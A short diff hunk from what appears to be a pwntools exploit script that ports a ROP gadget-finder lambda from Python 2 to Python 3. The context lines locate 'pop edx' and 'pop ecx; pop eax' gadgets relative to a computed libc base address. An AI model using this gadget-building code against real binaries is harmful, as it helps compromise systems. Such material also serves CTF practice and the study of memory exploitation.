@@ -58,7 +58,7 @@ ld_address=libc_address+0x1c6000
 
 
 
-gadget=lambda x:libc.search(asm(x)).next()+libc_address
+gadget=lambda x:next(libc.search(asm(x)))+libc_address
 
 pop_edx=gadget("pop edx ; ret")
 pop_ecx_eax=gadget("pop ecx ;pop eax ; ret")
